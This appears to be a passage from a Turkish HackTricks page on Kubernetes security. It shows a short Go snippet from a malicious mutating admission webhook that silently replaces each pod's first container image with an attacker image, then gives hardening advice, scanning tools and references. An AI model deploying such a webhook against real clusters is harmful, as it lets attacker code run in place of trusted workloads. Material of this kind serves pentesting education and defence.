![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format&format=webp)

Yukarıdaki görüntüde görebileceğiniz gibi, `nginx` imajını çalıştırmayı denedik ancak sonunda yürütülen imaj `rewanthtammana/malicious-image` oldu. Şimdi ne oldu!!?

#### Teknik Detaylar <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` betiği, istekleri değiştiren bir webhook admission controller oluşturur ve yapılandırma satırlarında belirtildiği gibi Kubernetes API'sine gelen istekleri değiştirerek gözlemlenen sonuçları etkiler:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Yukarıdaki parça, her poddaki ilk konteyner görüntüsünü `rewanthtammana/malicious-image` ile değiştirir.

## OPA Gatekeeper atlatma

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## En İyi Uygulamalar

### **Servis Hesabı Token'larının Otomatik Bağlanmasının Devre Dışı Bırakılması**

* **Podlar ve Servis Hesapları**: Varsayılan olarak, podlar bir servis hesabı token'ı bağlar. Güvenliği artırmak için, Kubernetes bu otomatik bağlanma özelliğinin devre dışı bırakılmasına izin verir.
* **Nasıl Uygulanır**: Kubernetes sürümü 1.6'dan başlayarak, servis hesapları veya podların yapılandırmasında `automountServiceAccountToken: false` olarak ayarlayın.

### **RoleBindings/ClusterRoleBindings'de Kısıtlayıcı Kullanıcı Ataması**

* **Seçici Dahil Etme**: RoleBindings veya ClusterRoleBindings'e yalnızca gerekli kullanıcıların dahil edildiğinden emin olun. Sık ​​sık denetleyin ve gereksiz kullanıcıları kaldırarak sıkı güvenliği koruyun.

### **Namespace-Specific Rollerin Cluster-Wide Rollere Tercihi**

* **Roller vs. ClusterRoller**: Cluster-wide uygulanan ClusterRoles ve ClusterRoleBindings yerine, namespace'e özgü izinler için Roller ve RoleBindings kullanmayı tercih edin. Bu yaklaşım daha ince kontrol sağlar ve izinlerin kapsamını sınırlar.

### **Otomatik araçlar kullanın**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Referanslar**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keşfedin**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** beni **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak HackTricks ve HackTricks Cloud github depolarına PR göndererek destek olun.**

</details>
